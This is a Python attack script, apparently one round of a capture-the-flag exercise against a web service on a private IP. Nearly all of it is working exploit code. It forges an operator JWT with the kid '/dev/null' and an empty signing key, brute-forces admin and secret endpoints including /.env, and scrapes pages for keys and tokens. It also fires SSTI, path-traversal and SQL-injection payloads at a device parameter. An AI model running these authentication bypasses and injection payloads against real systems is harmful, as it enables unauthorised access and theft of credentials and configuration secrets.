#!/usr/bin/env python3
"""round39 — Read full diagnostics page + continue phases that were interrupted"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

# ============================================================
print("="*70)
print("PHASE 1: FULL DIAGNOSTICS PAGE")
print("="*70)

try:
    r = requests.get(f"{CASPI}/ops/diagnostics", headers=AUTH_OP, timeout=15)
    print(f"  Status: [{r.status_code}] ({len(r.text)} bytes)")
    print(f"  Headers: {dict(r.headers)}")
    print()
    print("--- FULL RESPONSE ---")
    print(r.text)
    print("--- END ---")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: OTHER /ops/ ENDPOINTS")
print("="*70)

ops_paths = [
    "/ops/", "/ops/custody", "/ops/custody/ingest",
    "/ops/probe", "/ops/probe/sign", "/ops/probe/config",
    "/ops/config", "/ops/status", "/ops/health",
    "/ops/settings", "/ops/env", "/ops/debug",
    "/ops/keys", "/ops/secrets",
    "/ops/custody/list", "/ops/custody/tickets",
    "/ops/logs", "/ops/audit",
]

for path in ops_paths:
    try:
        r = requests.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=5)
        if r.status_code != 404:
            ct = r.headers.get('content-type','')[:30]
            preview = r.text[:120].replace('\n',' ')
            print(f"  [{r.status_code}] {path} ({ct}) {preview}")
    except:
        pass

# ============================================================
print("\n"+"="*70)
print("PHASE 3: DIAGNOSTICS PAGE — EXTRACT ALL LINKS AND DATA")
print("="*70)

try:
    r = requests.get(f"{CASPI}/ops/diagnostics", headers=AUTH_OP, timeout=15)
    if r.status_code == 200:
        import re

        # Extract all links
        links = re.findall(r'href=["\']([^"\']+)', r.text)
        if links:
            print("  Links found:")
            for l in links:
                print(f"    {l}")

        # Extract all form actions
        actions = re.findall(r'action=["\']([^"\']+)', r.text)
        if actions:
            print("  Form actions:")
            for a in actions:
                print(f"    {a}")

        # Extract all script tags
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
        for i, s in enumerate(scripts):
            if s.strip() and len(s.strip()) > 20:
                print(f"  Script {i}:")
                print(f"    {s[:500]}")

        # Extract all data attributes
        data_attrs = re.findall(r'data-([a-z-]+)=["\']([^"\']+)', r.text)
        if data_attrs:
            print("  Data attributes:")
            for name, val in data_attrs:
                print(f"    data-{name}={val}")

        # Look for any config/secret/key/probe/token mentions
        for keyword in ["secret", "key", "probe", "token", "config", "env", "flag", "KHS", "hmac", "sign"]:
            positions = [m.start() for m in re.finditer(keyword, r.text, re.IGNORECASE)]
            if positions:
                print(f"\n  Keyword '{keyword}' found at {len(positions)} positions:")
                for pos in positions[:5]:
                    context = r.text[max(0,pos-40):pos+60].replace('\n',' ')
                    print(f"    ...{context}...")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: SSTI IN PROBE DEVICE + PATH TRAVERSAL")
print("="*70)

# Test SSTI and path traversal in probe/sign device param
test_devices = [
    ("{{7*7}}", "SSTI"),
    ("{{config}}", "SSTI config"),
    ("{{config.items()}}", "SSTI config items"),
    ("../", "path traversal"),
    ("lm-01/../../../etc/hostname", "path traversal 2"),
    ("' OR 1=1--", "SQLi"),
    ("lm-01' UNION SELECT 1--", "SQLi union"),
]

for device, label in test_devices:
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign",
            params={"device": device}, headers=AUTH_OP, timeout=5)
        print(f"  [{r.status_code}] {label}: {r.text[:150]}")
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: SERVICES PAGE + OTHER PUBLIC PAGES")
print("="*70)

pages = ["/", "/services", "/login", "/register",
         "/about", "/contact", "/terms", "/privacy",
         "/admin", "/admin/", "/api/admin/",
         "/.env", "/robots.txt", "/sitemap.xml",
         "/static/", "/static/js/", "/static/js/app.js",
]

for path in pages:
    try:
        r = requests.get(f"{CASPI}{path}", timeout=5)
        if r.status_code != 404:
            ct = r.headers.get('content-type','')[:30]
            # Check for interesting content
            interesting = any(kw in r.text.lower() for kw in
                ["secret", "probe", "flag", "khs{", "config", "debug"])
            size = len(r.text)
            print(f"  [{r.status_code}] {path} ({ct}, {size}b) {'INTERESTING!' if interesting else ''}")
            if interesting:
                # Find the interesting parts
                for kw in ["secret", "probe", "flag", "khs{", "config", "debug"]:
                    import re
                    for m in re.finditer(kw, r.text, re.IGNORECASE):
                        ctx = r.text[max(0,m.start()-30):m.start()+50].replace('\n',' ')
                        print(f"    '{kw}': ...{ctx}...")
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
